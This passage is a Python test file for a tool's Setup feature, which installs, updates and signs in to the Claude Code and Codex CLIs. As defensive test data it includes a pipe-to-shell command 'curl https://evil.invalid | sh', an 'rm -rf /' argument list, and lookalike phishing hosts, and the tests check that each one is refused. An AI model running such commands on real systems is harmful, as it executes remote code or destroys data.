                self.assertIn("CODEX_HOME", installer["env"])
                self.assertNotIn("CLAUDE_CODE_OAUTH_TOKEN", installer["env"])
                self.assertEqual({"NO_COLOR", "TERM"} - set(installer["env"]), set())


# 6-9. Steps: install, failures, stop -------------------------------------------------------------------------------

class InstallTests(HttpCase):
    def test_an_install_shows_cleaned_output_remembers_its_folder_and_works_at_once(self):
        marker = f"SETUP-MARKER-{os.getpid()}-{time.time_ns()}"
        self.steer(marker=marker)
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        task = answer["task"]
        self.assertEqual(task["command"], shlex.join(["/bin/bash", "-o", "pipefail", "-c",
                                                      program_setup.INSTALLERS[("claude", "posix")]]))
        done = self.wait(task["id"])
        self.assertEqual(done["state"], "succeeded", done)
        self.assertEqual(done["lines"][:2], [f"Checking this computer: macOS, arm64 {marker}", "Downloading 100%"])
        joined = "\n".join(done["lines"])
        for secret in RAW_SECRETS:
            self.assertNotIn(secret, joined)
        self.assertIn("key [removed key] and [removed key] seen", done["lines"])
        self.assertIn("proxy http://[removed]@proxy.example:8080 used", done["lines"])
        self.assertEqual(done["result"], {"tone": "done", "exitCode": 0, "text": "Installed: 2.1.289 (Claude Code) at "
                                          "~/.local/bin/claude. Jobs find it there; open a new terminal to use it "
                                          "yourself."})
        # Paging: only the lines after the ones the page has.
        later = self.task(task["id"], after=done["next"] - 2)
        self.assertEqual(later["lines"], done["lines"][-2:])
        # ~/.local/bin is not on PATH: the folder is remembered (owner-only), and jobs find Claude Code now.
        saved = providers.state_directory() / providers.PROGRAM_FOLDERS
        self.assertEqual(json.loads(saved.read_text()), {"version": 1, "folders": {"claude": str(self.home / ".local" / "bin")}})
        if POSIX:
            self.assertEqual(stat.S_IMODE(saved.stat().st_mode), 0o600)
            self.assertEqual(stat.S_IMODE(saved.parent.stat().st_mode), 0o700)
        self.assertEqual(claude_cli.executable(runtime), str(self.home / ".local" / "bin" / "claude"))
        claude = self.program(self.status("cached=1"), "claude")
        self.assertEqual((claude["state"], claude["kind"], claude["remembered"]),
                         ("works", "installer", str(self.home / ".local" / "bin")))
        self.assertIn("Jobs find it in ~/.local/bin, which TCS Prover remembers because it is not on the path TCS "
                      "Prover started with.", claude["notes"])
        # The output was never written anywhere: not in the runs, not in the private state.
        for folder in (self.root / "runs", providers.state_directory(), self.home):
            for path in folder.rglob("*"):
                if path.is_file() and not path.is_symlink():
                    self.assertNotIn(marker.encode(), path.read_bytes(), path)

    def test_a_second_install_while_one_runs_starts_nothing(self):
        self.steer(sleep=1)
        code, answer = self.act("codex", "install")
        self.assertEqual(code, 200, answer)
        first = answer["task"]
        self.wait_task(self.task, first["id"], states=("running",))
        for _ in range(50):
            if (self.state / "installer-pid").exists():
                break
            time.sleep(0.05)
        code, again = self.call("/setup/action", {"program": "codex", "action": "install",
                                                  "command": first["command"]})
        self.assertEqual(code, 409, again)
        self.assertEqual(again["error"], "Another Setup step for the Codex CLI is running.")
        self.assertEqual(again["task"]["id"], first["id"])
        self.assertEqual(len(self.calls("installer")), 1)
        self.call("/setup/stop", {"id": first["id"]})
        self.wait(first["id"])

    def test_failures_are_named_in_plain_words(self):
        cases = [({"exit.txt": "6", "no-place": "1"}, "Could not find the download server. Check this computer's "
                                                      "internet connection. Exit code 6.", "failed"),
                 ({"web-page": "1"}, "The download returned a web page instead of the installer, often because of a "
                                     "proxy or a regional block. Exit code 2.", "failed"),
                 ({"no-place": "1"}, "The installer finished, but TCS Prover cannot find Claude Code in ~/.local/bin. "
                                     "See the output above.", "failed"),
                 ({"exit.txt": "1"}, "The command ended with exit code 1. See the output above. Claude Code runs now "
                                     "(2.1.289 (Claude Code)).", "failed")]
        for files, text, state in cases:
            with self.subTest(files=files):
                for name in ("exit.txt", "no-place", "web-page"):
                    (self.state / name).unlink(missing_ok=True)
                for name, value in files.items():
                    (self.state / name).write_text(value)
                shutil.rmtree(self.home / ".local", ignore_errors=True)
                (providers.state_directory() / providers.PROGRAM_FOLDERS).unlink(missing_ok=True)
                if files == {"exit.txt": "1"}:
                    # Found on PATH afterwards: the step still failed, and the result says Claude Code runs now.
                    os.environ["PATH"] = f"{self.bin}:{self.home / '.local' / 'bin'}:/usr/bin:/bin"
                self.status()
                code, answer = self.act("claude", "install")
                self.assertEqual(code, 200, answer)
                done = self.wait(answer["task"]["id"])
                self.assertEqual((done["state"], done["result"]["text"]), (state, text))

    @unittest.skipUnless(POSIX, "POSIX process groups")
    def test_stop_ends_the_installer_and_everything_it_started(self):
        self.steer(sleep=1)
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        identity = answer["task"]["id"]
        deadline = time.monotonic() + 10
        while not (self.state / "child-pid").exists() and time.monotonic() < deadline:
            time.sleep(0.05)
        pids = [int((self.state / name).read_text()) for name in ("installer-pid", "child-pid")]
        started = time.monotonic()
        code, stopping = self.call("/setup/stop", {"id": identity})
        self.assertEqual(code, 200, stopping)
        self.assertTrue(stopping["task"]["stopping"])
        done = self.wait(identity)
        self.assertLess(time.monotonic() - started, program_setup.STOP_GRACE_SECONDS + 5)
        self.assertEqual((done["state"], done["result"]["text"]),
                         ("stopped", "Stopped. Run Install again to finish or repair it."))
        for pid in pids:
            for _ in range(40):
                try:
                    os.kill(pid, 0)
                except ProcessLookupError:
                    break
                time.sleep(0.05)
            else:
                self.fail(f"process {pid} outlived Stop")
        # Stopping a step that has ended changes nothing.
        code, again = self.call("/setup/stop", {"id": identity})
        self.assertEqual((code, again["task"]["state"]), (200, "stopped"))

    def test_the_output_keeps_the_newest_lines_and_says_so(self):
        self.steer(lines=2500, long_line=5000)
        code, answer = self.act("codex", "install")
        done = self.wait(answer["task"]["id"])
        self.assertEqual(len(done["lines"]), program_setup.KEPT_LINES)
        total = done["next"]
        self.assertEqual((done["first"], done["dropped"]), (total - 2000, total - 2000))
        self.assertGreaterEqual(done["dropped"], 500)
        cut = next(line for line in done["lines"] if line.startswith("xxxx"))
        self.assertEqual(cut, "x" * 2000 + " … (line cut, 5,000 characters)")

    def test_a_long_line_still_being_written_shows_its_newest_text_and_says_so(self):
        self.steer(sleep=1, partial=5000)
        code, answer = self.act("codex", "install")
        self.assertEqual(code, 200, answer)
        identity = answer["task"]["id"]
        deadline = time.monotonic() + 10
        task = self.task(identity)
        while not task["partial"] and time.monotonic() < deadline:
            time.sleep(0.1)
            task = self.task(identity)
        note = "(start of this line not shown, 5,018 characters so far) …"
        self.assertTrue(task["partial"].startswith(note), task["partial"][:100])
        self.assertTrue(task["partial"].endswith("NEWEST-OUTPUT-TAIL"))
        self.assertEqual(len(task["partial"]), len(note) + program_setup.LINE_CHARS)
        self.call("/setup/stop", {"id": identity})
        self.wait(identity)

    @unittest.skipUnless(POSIX, "POSIX sessions")
    def test_an_installer_runs_in_a_session_of_its_own(self):
        self.steer(record_sid=1)
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        self.wait(answer["task"]["id"])
        # No terminal: a session of its own (an installer that opens /dev/tty or a Ctrl-C never reach TCS Prover's).
        self.assertNotEqual(int((self.state / "installer-sid").read_text()), os.getsid(0))

    @unittest.skipUnless(POSIX, "POSIX process groups")
    def test_stop_also_ends_a_child_that_started_a_session_of_its_own(self):
        self.steer(sleep=1, detached_child=1)
        code, answer = self.act("codex", "install")
        self.assertEqual(code, 200, answer)
        identity = answer["task"]["id"]
        child = int(self.wait_for(self.state / "child-pid").read_text())
        self.addCleanup(self.kill, child)
        self.wait_for(self.state / "installer-pid")
        code, _ = self.call("/setup/stop", {"id": identity})
        self.assertEqual(code, 200)
        done = self.wait(identity)
        self.assertEqual(done["state"], "stopped", done)
        self.assertTrue(self.ended(child), "a child in a session of its own outlived Stop")

    @unittest.skipUnless(POSIX, "POSIX process groups")
    def test_what_an_install_leaves_in_its_process_group_ends_with_it(self):
        self.steer(leftover=1)
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["state"], "succeeded", done)
        child = int((self.state / "leftover-pid").read_text())
        self.addCleanup(self.kill, child)
        self.assertTrue(self.ended(child), "a child the installer left kept running after the step ended")
        time.sleep(0.5)
        self.assertEqual(self.task(done["id"])["next"], done["next"])  # Nothing more reaches the ended step.

    def test_a_stop_while_the_result_is_checked_keeps_the_install_and_starts_no_sign_in(self):
        self.steer(codex_login="none", codex_version_sleep=3)
        code, answer = self.act("codex", "install", signInAfter=True, signInOption="browser")
        self.assertEqual(code, 200, answer)
        identity = answer["task"]["id"]
        # The installer has ended; the check that tells its result runs `codex --version` (3 seconds here).
        deadline = time.monotonic() + 20
        while ["--version"] not in [row["argv"] for row in self.calls("codex")] and time.monotonic() < deadline:
            time.sleep(0.05)
        checking = self.task(identity)
        self.assertEqual((checking["state"], checking["checking"]), ("running", True))
        code, stopping = self.call("/setup/stop", {"id": identity})
        self.assertEqual((code, stopping["task"]["stopping"]), (200, True))
        done = self.wait(identity)
        self.assertEqual((done["state"], done["nextTask"]), ("succeeded", ""))
        self.assertEqual(done["result"]["text"], "Installed: codex-cli 0.160.0 at ~/.local/bin/codex. Jobs find it "
                                                 "there; open a new terminal to use it yourself. Stop came after the "
                                                 "installer had finished, so the sign-in you chose was not started.")
        time.sleep(0.5)
        self.assertNotIn(["app-server"], [row["argv"] for row in self.calls("codex")])

    @unittest.skipUnless(POSIX, "POSIX sessions")
    def test_a_stop_while_the_output_drains_keeps_the_install_and_remembers_its_folder(self):
        self.steer(linger=1)  # The installer ends with 0; a child of its own session holds the output a while.
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        identity = answer["task"]["id"]
        self.addCleanup(self.kill, int(self.wait_for(self.state / "linger-pid").read_text()))
        deadline = time.monotonic() + 10
        while not self.task(identity)["checking"] and time.monotonic() < deadline:
            time.sleep(0.05)
        code, _ = self.call("/setup/stop", {"id": identity})
        self.assertEqual(code, 200)
        done = self.wait(identity)
        self.assertEqual(done["state"], "succeeded", done)
        self.assertEqual(done["result"]["text"], "Installed: 2.1.289 (Claude Code) at ~/.local/bin/claude. Jobs find "
                                                 "it there; open a new terminal to use it yourself. Stop came after "
                                                 "the installer had finished.")
        saved = providers.state_directory() / providers.PROGRAM_FOLDERS
        self.assertEqual(json.loads(saved.read_text())["folders"], {"claude": str(self.home / ".local" / "bin")})

    def test_closing_the_server_stops_a_running_step(self):
        self.steer(sleep=1)
        code, answer = self.act("codex", "install")
        deadline = time.monotonic() + 10
        while not (self.state / "installer-pid").exists() and time.monotonic() < deadline:
            time.sleep(0.05)
        pid = int((self.state / "installer-pid").read_text())
        task = self.http.setup.task(answer["task"]["id"])
        self.http.setup.close()
        self.assertEqual(task.snapshot()["state"], "stopped")
        with self.assertRaises(ProcessLookupError):
            for _ in range(40):
                os.kill(pid, 0)
                time.sleep(0.05)


class UpdateTests(HttpCase):
    def test_update_runs_claude_update_and_compares_the_versions(self):
        self.official_claude()
        code, answer = self.act("claude", "update")
        self.assertEqual(code, 200, answer)
        self.assertEqual(answer["task"]["command"], shlex.join([str(self.bin / "claude"), "update"]))
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["result"]["text"], "Updated from 2.1.289 (Claude Code) to 2.1.300 (Claude Code).")
        code, answer = self.act("claude", "update")
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["result"]["text"], "Already the newest version (2.1.300 (Claude Code)).")

    def test_codex_update_runs_the_installer_again(self):
        self.official_codex()
        code, answer = self.act("codex", "update")
        self.assertEqual(code, 200, answer)
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["result"]["text"], "Already the newest version (codex-cli 0.160.0).")
        self.assertEqual(self.calls("installer")[0]["argv"], ["codex"])


# 10-12, 16. Confirmation, protection, administrator, request checks ----------------------------------------------

class ConfirmationTests(HttpCase):
    def test_a_missing_or_changed_command_starts_nothing(self):
        self.status()
        for command in (None, "curl https://evil.invalid | sh"):
            body = {"program": "codex", "action": "install", **({"command": command} if command else {})}
            code, answer = self.call("/setup/action", body)
            self.assertEqual(code, 409, answer)
            self.assertEqual(answer["error"], program_setup.STALE_TEXT)
            self.assertEqual(answer["status"]["programs"]["codex"]["state"], "missing")
        self.assertEqual(self.calls("installer"), [])

    def test_unknown_programs_actions_and_options_are_refused(self):
        for body in ({"program": "latex", "action": "install", "command": "x"},
                     {"program": "codex", "action": "uninstall", "command": "x"},
                     {"program": "codex", "action": "sign-in", "option": "apikey", "command": "x"},
                     {"program": "codex", "action": "install", "option": "browser", "command": "x"},
                     {"program": "codex", "action": "install", "command": "x", "signInAfter": "yes"}):
            with self.subTest(body=body):
                code, answer = self.call("/setup/action", body)
                self.assertEqual((code, answer["error"]), (400, "Unknown Setup action."))

    def test_extra_fields_never_reach_the_command(self):
        code, answer = self.act("claude", "install", argv=["rm", "-rf", "/"], env={"X": "1"}, line="echo hi",
                                folder="/etc")
        self.assertEqual(code, 200, answer)
        self.wait(answer["task"]["id"])
        self.assertEqual(self.calls("installer")[0]["argv"], ["claude"])

    def test_every_setup_route_checks_the_token_the_host_and_the_origin(self):
        routes = [("/setup", None), ("/setup/task?id=s-x", None), ("/setup/action", {"program": "codex"}),
                  ("/setup/stop", {"id": "s-x"}), ("/setup/input", {"id": "s-x", "text": "a#b"})]
        for path, body in routes:
            for options in ({"token": False}, {"host": "localhost"}, {"origin": "http://evil.invalid"}):
                with self.subTest(path=path, options=options):
                    code, _ = self.call(path, body, **options)
                    self.assertEqual(code, 403)
        self.assertEqual(self.calls(), [])

    def test_an_unexpected_failure_is_answered_without_a_traceback(self):
        import contextlib
        import io
        errors = io.StringIO()
        with mock.patch.object(program_setup.SetupTasks, "status", side_effect=RuntimeError("boom")), \
                contextlib.redirect_stderr(errors):
            code, answer = self.call("/setup")
        self.assertEqual((code, answer), (500, {"error": "Setup failed (RuntimeError)"}))
        self.assertEqual(errors.getvalue(), "")

    def test_an_unknown_or_forgotten_step_is_404(self):
        code, answer = self.call("/setup/task?id=s-000000000000")
        self.assertEqual((code, answer["error"]), (404, program_setup.GONE_TEXT))


class ProtectionTests(HttpCase):
    def job(self, phase="running", worker=True, **models):
        app = server.App(runs=self.root / "runs", load_latest=False)
        app._new_run("Prove the protected statement.")
        app.state.update(runId=app.run_dir.name, phase=phase, draft="Prove the protected statement.\nMore.",
                         workflowStages={"review": False, "author": True, "critic": True, "writing": False},
                         **{"authorModel": "gpt-6.1-sol", "criticModel": "gpt-6.1-sol", **models})
        if worker:
            app.worker_token = object()
        with self.http.jobs_lock:
            self.http.jobs[app.state["runId"]] = app
        return app

    def test_update_and_sign_in_again_wait_for_running_jobs_of_that_program_only(self):
        self.official_codex()
        self.official_claude()
        self.job()
        status = self.status()
        reason = ("Unavailable while 1 job uses the Codex CLI: “Prove the protected statement.”. Pause or stop it, or "
                  "let it finish.")
        codex = self.program(status, "codex")["actions"]
        self.assertEqual((codex["update"]["available"], codex["update"]["reason"]), (False, reason))
        self.assertEqual((codex["signIn"]["available"], codex["signIn"]["reason"]), (False, reason))
        code, answer = self.act("codex", "update")
        self.assertEqual((code, answer["error"]), (409, reason))
        code, answer = self.act("codex", "sign-in", "browser")
        self.assertEqual((code, answer["error"]), (409, reason))
        claude = self.program(status, "claude")["actions"]
        self.assertTrue(claude["update"]["available"] and claude["signIn"]["available"])
        self.assertEqual(self.calls("installer"), [])

    def test_a_paused_job_without_a_worker_allows_them(self):
        self.official_codex()
        self.job(phase="paused", worker=False)
        codex = self.program(self.status(), "codex")["actions"]
        self.assertTrue(codex["update"]["available"] and codex["signIn"]["available"])

    def test_an_openai_format_api_author_also_uses_the_codex_cli(self):
        self.official_codex()
        connection = providers.save_api_connection(
            {"label": "Lab key", "format": "openai", "baseUrl": "https://api.lab.invalid/v1", "apiKey": "sk-lab-555555555"},
            [{"id": "lab-model", "label": "Lab model"}])
        model = connection["models"][0]["modelId"]
        self.job(authorModel=model, criticModel="claude-opus-5-5")
        status = self.status()
        self.assertFalse(self.program(status, "codex")["actions"]["update"]["available"])
        self.assertEqual(status["connections"], {"codex": ["Lab key"], "claude": []})

    REASON = ("Unavailable while 1 job uses the Codex CLI: “Prove the protected statement.”. Pause or stop it, or "
              "let it finish.")

    def waiting(self, app, failure, stage="critic", every=True):
        """The runner's record of a model call that waits to retry; with ``every``, every call in progress waits
        (the runner then pauses the workflow clock), else another call still runs."""

        app._follow_model_retry({"kind": "status", "stage": stage, "label": runtime.RETRY_LABEL,
                                 **({"budgetClock": "paused"} if every else {}),
                                 "retryAt": time.time() + 600, "retryAttempt": 2, "failure": failure,
                                 "text": f"Model call failed ({failure}) — retrying in 1 minute (attempt 2)."})

    def test_a_sign_in_that_could_not_be_checked_waits_for_running_jobs_too(self):
        self.official_codex()
        self.steer(codex_login="error")  # A locked keyring: there may well be a login it would replace.
        self.job()
        codex = self.program(self.status(), "codex")
        self.assertEqual(codex["signIn"], {"state": "unknown", "text": "The keyring is locked", "method": ""})
        sign_in = codex["actions"]["signIn"]
        self.assertEqual((sign_in["label"], sign_in["available"], sign_in["reason"]), ("Sign in", False, self.REASON))
        self.assertEqual(sign_in["dialog"]["warning"], "This may replace the current login.")
        code, answer = self.act("codex", "sign-in", "browser")
        self.assertEqual((code, answer["error"]), (409, self.REASON))
        self.assertNotIn(["app-server"], [row["argv"] for row in self.calls("codex")])

    def test_a_job_waiting_for_a_login_never_holds_the_sign_in_it_waits_for(self):
        self.official_codex()  # A saved ChatGPT login, which the critic's calls find refused.
        app = self.job()
        # While another model call of it still runs, it holds the sign-in.
        self.waiting(app, "authentication failed", every=False)
        sign_in = self.program(self.status(), "codex")["actions"]["signIn"]
        self.assertEqual((sign_in["available"], sign_in["reason"]), (False, self.REASON))
        # Every call waits for the login: no model process of it runs, and its alert sends you to Setup.
        self.waiting(app, "authentication failed")
        self.assertEqual(app.attention()["kind"], "login")
        sign_in = self.program(self.status(), "codex")["actions"]["signIn"]
        self.assertEqual((sign_in["label"], sign_in["available"], sign_in["reason"]), ("Sign in again", True, ""))
        # Once a model call of it runs again, it holds the sign-in as any running job does.
        app._follow_model_retry({"kind": "status", "stage": "critic", "label": runtime.RETRY_LABEL, "retryAttempt": 2,
                                 "budgetClock": "running",
                                 "text": "Retrying the model call of the critic now (attempt 2)."})
        sign_in = self.program(self.status(), "codex")["actions"]["signIn"]
        self.assertEqual((sign_in["available"], sign_in["reason"]), (False, self.REASON))

    def test_a_job_waiting_for_a_program_that_does_not_run_never_holds_its_repair(self):
        self.official_codex()
        self.steer(codex_version_exit=1)  # OpenAI's install no longer runs: Install repairs it.
        app = self.job()
        self.waiting(app, "Codex CLI missing or incompatible", stage="solve")
        self.assertEqual(app.attention()["kind"], "cli")
        install = self.program(self.status(), "codex")["actions"]["install"]
        self.assertEqual((install["shown"], install["available"], install["reason"]), (True, True, ""))
        code, answer = self.act("codex", "install")
        self.assertEqual(code, 200, answer)
        self.wait(answer["task"]["id"])
        self.assertEqual(len(self.calls("installer")), 1)

    def test_a_job_waiting_for_another_cause_still_holds_the_repair(self):
        self.official_codex()
        self.steer(codex_version_exit=1)
        app = self.job()
        self.waiting(app, "usage limit reached")
        install = self.program(self.status(), "codex")["actions"]["install"]
        self.assertEqual((install["available"], install["reason"]), (False, self.REASON))

    def test_a_running_model_call_holds_the_repair_of_its_program(self):
        self.official_codex()
        self.steer(codex_version_exit=1)
        self.job()  # Its author's model call runs.
        install = self.program(self.status(), "codex")["actions"]["install"]
        self.assertEqual((install["shown"], install["available"], install["reason"]), (True, False, self.REASON))
        code, answer = self.act("codex", "install")
        self.assertEqual((code, answer["error"]), (409, self.REASON))
        self.assertEqual(self.calls("installer"), [])

    def test_a_running_job_never_holds_the_install_of_its_missing_program(self):
        self.job()  # Its runner retries the missing Codex CLI every minute.
        install = self.program(self.status(), "codex")["actions"]["install"]
        self.assertEqual((install["shown"], install["available"], install["reason"]), (True, True, ""))

    def test_installing_a_missing_program_and_a_first_sign_in_are_never_held(self):
        self.job(authorModel="claude-opus-5-5", criticModel="claude-opus-5-5")
        self.place("claude")
        self.steer(claude_login="none")
        status = self.status()
        self.assertTrue(self.program(status, "codex")["actions"]["install"]["available"])
        self.assertTrue(self.program(status, "claude")["actions"]["signIn"]["available"])
        self.assertEqual(self.program(status, "claude")["actions"]["signIn"]["label"], "Sign in")


class AdministratorTests(HttpCase):
    @unittest.skipUnless(hasattr(os, "geteuid"), "POSIX")
    def test_as_root_every_action_is_refused_and_the_checks_still_show(self):
        self.place("codex")
        with mock.patch.object(os, "geteuid", return_value=0):
            status = self.status()
            self.assertEqual(status["elevated"], "root")
            self.assertEqual(status["elevatedText"], program_setup.ADMIN_TEXT["root"])
            codex = self.program(status, "codex")
            self.assertEqual(codex["state"], "works")
            self.assertFalse(any(action["shown"] for action in codex["actions"].values()))
            for body in ({"program": "claude", "action": "install", "command": "x"},
                         {"program": "codex", "action": "sign-in", "option": "browser", "command": "x"}):
                code, answer = self.call("/setup/action", body)
                self.assertEqual((code, answer["error"]), (403, program_setup.ADMIN_TEXT["root"]))
        self.assertEqual(self.calls("installer"), [])


# 13-15. Sign-ins and the chain -------------------------------------------------------------------------------------

class CodexSignInTests(HttpCase):
    def setUp(self):
        super().setUp()
        self.place("codex")
        self.steer(codex_login="none")

    def start(self, option="browser"):
        code, answer = self.act("codex", "sign-in", option)
        self.assertEqual(code, 200, answer)
        return self.wait(answer["task"]["id"], states=("waiting", "succeeded", "failed", "stopped"))

    def test_a_browser_sign_in_shows_the_link_never_logs_it_and_finishes_by_itself(self):
        waiting = self.start()
        self.assertEqual(waiting["state"], "waiting", waiting)
        self.assertEqual(waiting["link"], {"url": "https://auth.openai.com/oauth/authorize?client_id=x&state=STATE123"
                                                  "&code_challenge=CH", "trusted": True, "host": "auth.openai.com"})
        self.assertNotIn("STATE123", "\n".join(waiting["lines"]))
        self.assertIn(program_setup.WAITING_TEXT, waiting["lines"])
        self.steer(complete="ok")
        done = self.wait(waiting["id"])
        self.assertEqual((done["state"], done["result"]["text"]), ("succeeded", "Signed in with ChatGPT."))
        self.assertEqual(self.program(self.status("cached=1"), "codex")["signIn"]["state"], "signed-in")
        rpc = [row.get("rpc") for row in self.calls("codex") if row.get("rpc")]
        self.assertEqual(rpc[:4], ["initialize", "initialized", "config/read", "account/login/start"])
        start = next(row for row in self.calls("codex") if row.get("rpc") == "account/login/start")
        self.assertEqual(start["message"]["params"], {"type": "chatgpt"})
        self.assertNotIn("jsonrpc", start["message"])

    def test_a_one_time_code(self):
        waiting = self.start("code")
        self.assertEqual(waiting["code"], {"url": "https://auth.openai.com/codex/device", "trusted": True,
                                           "host": "auth.openai.com", "userCode": "ABCD-1234"})
        self.assertIsNone(waiting["link"])

    def test_stop_cancels_the_sign_in_and_ends_the_app_server(self):
        waiting = self.start()
        code, _ = self.call("/setup/stop", {"id": waiting["id"]})
        done = self.wait(waiting["id"])
        self.assertEqual((done["state"], done["result"]["text"]), ("stopped", "Sign-in stopped."))
        cancel = [row for row in self.calls("codex") if row.get("rpc") == "account/login/cancel"]
        self.assertEqual(cancel[0]["message"]["params"], {"loginId": "L1"})
        pid = next(row["pid"] for row in self.calls("codex") if row["argv"] == ["app-server"])
        for _ in range(40):
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        else:
            self.fail("the app-server outlived Stop")

    def test_refusals_are_named(self):
        cases = {"port-busy": ("browser", "Another Codex sign-in is waiting on this computer (port 1455 is in use). "
                                          "Finish or close it, or sign in with a code."),
                 "device-disabled": ("code", "Sign-in with a code is not turned on for your ChatGPT account. Turn on "
                                             "device code sign-in in ChatGPT's security settings, or sign in in this "
                                             "browser."),
                 "unknown": ("browser", "This Codex CLI cannot sign in from TCS Prover. Run codex login in a terminal "
                                        "(or codex login --device-auth on another computer).")}
        for mode, (option, text) in cases.items():
            with self.subTest(mode=mode):
                self.steer(codex_signin=mode)
                done = self.start(option)
                self.assertEqual((done["state"], done["result"]["text"]), ("failed", text))
        self.assertEqual(done["openCommands"], "sign-in")
        self.steer(codex_signin="ok", codex_forced="api")
        done = self.start()
        self.assertEqual(done["result"]["text"], "Your Codex settings allow only API-key sign-in (forced_login_method = api).")

    def test_other_lines_go_to_the_log_and_requests_are_refused(self):
        self.steer(codex_request=1)
        waiting = self.start()
        self.assertIn("this line is not JSON", waiting["lines"])
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            replies = [row["message"] for row in self.calls("codex") if row.get("rpc") == "reply"]
            if replies:
                break
            time.sleep(0.05)
        self.assertEqual(replies[0], {"id": 99, "error": {"code": -32601, "message": "TCS Prover Setup cannot answer this."}})
        self.call("/setup/stop", {"id": waiting["id"]})
        self.wait(waiting["id"])

    def test_a_new_sign_in_replaces_the_one_that_waits(self):
        first = self.start()
        waiting = self.http.setup.task(first["id"])  # Kept here: the page keeps only the latest step.
        second = self.start("code")
        self.assertEqual(second["state"], "waiting")
        self.assertEqual((waiting.snapshot()["state"], waiting.snapshot()["result"]["text"]),
                         ("stopped", program_setup.REPLACED_TEXT))
        starts = [row for row in self.calls("codex") if row["argv"] == ["app-server"] and "rpc" not in row]
        self.assertEqual(len(starts), 2)
        self.call("/setup/stop", {"id": second["id"]})
        self.wait(second["id"])

    def test_a_chatgpt_login_outside_auth_json_gets_the_keyring_note(self):
        self.steer(codex_login="chatgpt")
        codex = self.program(self.status(), "codex")
        self.assertIn("Your Codex login is kept in the system keyring, not in ~/../codexhome/auth.json".replace(
            "~/../codexhome", str(self.codex_home)), " ".join(codex["notes"]))
        (self.codex_home / "auth.json").write_text("{}")
        codex = self.program(self.status(), "codex")
        self.assertNotIn("keyring", " ".join(codex["notes"]))


class ClaudeSignInTests(HttpCase):
    def setUp(self):
        super().setUp()
        self.place("claude")
        self.steer(claude_login="none")

    def start(self, option="subscription"):
        code, answer = self.act("claude", "sign-in", option)
        self.assertEqual(code, 200, answer)
        return self.wait(answer["task"]["id"], states=("waiting", "succeeded", "failed"))

    def test_the_link_the_code_and_the_result(self):
        waiting = self.start()
        url = "https://claude.ai/oauth/authorize?code=true&client_id=c&state=ST4TE&code_challenge=CC"
        self.assertEqual(waiting["link"], {"url": url, "trusted": True, "host": "claude.ai"})
        self.assertEqual(waiting["lines"], ["Opening browser to sign in…",
                                            "If the browser didn't open, visit: (the link is shown above)"])
        # The prompt without a line break shows once it has waited PARTIAL_SECONDS.
        time.sleep(program_setup.PARTIAL_SECONDS + 0.2)
        self.assertEqual(self.task(waiting["id"])["partial"], "Paste code here if prompted > ")
        for text in ("no-hash", "two words#x", "a#b\x07", "a#" + "b" * 512, "", 7):
            with self.subTest(text=text):
                code, answer = self.call("/setup/input", {"id": waiting["id"], "text": text})
                self.assertEqual((code, answer["error"]), (400, program_setup.CODE_FORMAT_TEXT))
        self.assertFalse((self.state / "claude-codes").exists())
        code, answer = self.call("/setup/input", {"id": waiting["id"], "text": "bad#code"})
        self.assertEqual((code, answer["task"]["input"]), (200, {"sent": True, "message": ""}))
        deadline = time.monotonic() + 5
        while self.task(waiting["id"])["input"]["sent"] and time.monotonic() < deadline:
            time.sleep(0.05)
        self.assertEqual(self.task(waiting["id"])["input"], {"sent": False, "message": program_setup.CODE_REFUSED_TEXT})
        code, answer = self.call("/setup/input", {"id": waiting["id"], "text": "  abc#def  "})
        self.assertEqual(code, 200, answer)
        done = self.wait(waiting["id"])
        self.assertEqual((done["state"], done["result"]["text"]), ("succeeded", "Signed in as a@b.com (Claude Max)."))
        self.assertEqual((self.state / "claude-codes").read_text().splitlines(), ["bad#code", "abc#def"])
        self.assertEqual(self.calls("claude")[-1]["argv"], ["auth", "status", "--json"])
        self.assertTrue(all("abc#def" not in text and "bad#code" not in text for text in self.responses))
        code, answer = self.call("/setup/input", {"id": waiting["id"], "text": "abc#def"})
        self.assertEqual((code, answer["error"]), (409, program_setup.NOT_WAITING_TEXT))

    def test_a_refused_sign_in_and_the_console_option(self):
        self.steer(claude_login_result="fail")
        waiting = self.start("console")
        self.assertEqual([row["argv"] for row in self.calls("claude") if row["argv"][:2] == ["auth", "login"]],
                         [["auth", "login", "--console"]])
        self.call("/setup/input", {"id": waiting["id"], "text": "abc#def"})
        done = self.wait(waiting["id"])
        self.assertEqual((done["state"], done["result"]["text"]), ("failed", "Claude Code could not sign in: denied."))
        self.steer(claude_login_result="managed")
        done = self.start()
        done = self.wait(done["id"])
        self.assertEqual(done["result"]["text"], "Your organization's settings require signing in inside Claude Code: "
                                                 "run claude, then /login, in a terminal.")

    def test_a_code_the_sign_in_prints_back_is_removed(self):
        self.steer(claude_echo=1)
        waiting = self.start()
        code, answer = self.call("/setup/input", {"id": waiting["id"], "text": "abc#def"})
        self.assertEqual(code, 200, answer)
        done = self.wait(waiting["id"])
        self.assertEqual(done["state"], "succeeded", done)
        self.assertIn("received [removed]", done["lines"])
        self.assertFalse(any("abc#def" in line for line in done["lines"]), done["lines"])

    def test_a_link_to_an_unexpected_host_is_not_a_link(self):
        self.steer(claude_url="https://claude.ai.evil.invalid/oauth?state=X")
        waiting = self.start()
        self.assertEqual(waiting["link"], {"url": "https://claude.ai.evil.invalid/oauth?state=X", "trusted": False,
                                           "host": "claude.ai.evil.invalid"})


class ChainTests(HttpCase):
    def test_install_then_sign_in_under_one_confirmation(self):
        self.steer(claude_login="none")
        code, answer = self.act("claude", "install", signInAfter=True, signInOption="subscription")
        self.assertEqual(code, 200, answer)
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["state"], "succeeded", done)
        self.assertTrue(done["nextTask"])
        waiting = self.wait(done["nextTask"], states=("waiting",))
        self.assertEqual((waiting["action"], waiting["option"]), ("sign-in", "subscription"))
        self.assertEqual(self.program(self.status("cached=1"), "claude")["task"]["id"], done["nextTask"])
        self.call("/setup/stop", {"id": waiting["id"]})
